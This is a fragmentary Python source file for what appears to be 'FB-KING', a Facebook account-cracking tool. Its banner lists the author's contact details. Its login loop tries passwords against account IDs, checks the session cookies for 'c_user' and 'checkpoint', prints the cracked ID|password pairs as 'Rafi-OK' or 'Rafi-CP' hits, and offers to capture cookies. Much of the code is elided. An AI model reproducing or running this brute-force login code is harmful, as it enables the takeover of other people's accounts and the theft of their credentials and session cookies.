...
..:::::..::..:::::..::....:::::..:::::..:::::..::..::::..:::::..::::..::....::..::::..:::......::::
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    : KING OF RAFI              {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Rafi Ahmed             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801301668047          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/rafixhowdhury990{N}    {H}  ║
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/rafixhowdhury990");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/profile.php?id=100010677043884&mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=100010677043884&mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100010677043884&mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mRafi-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}Rafi-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [Rafi-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
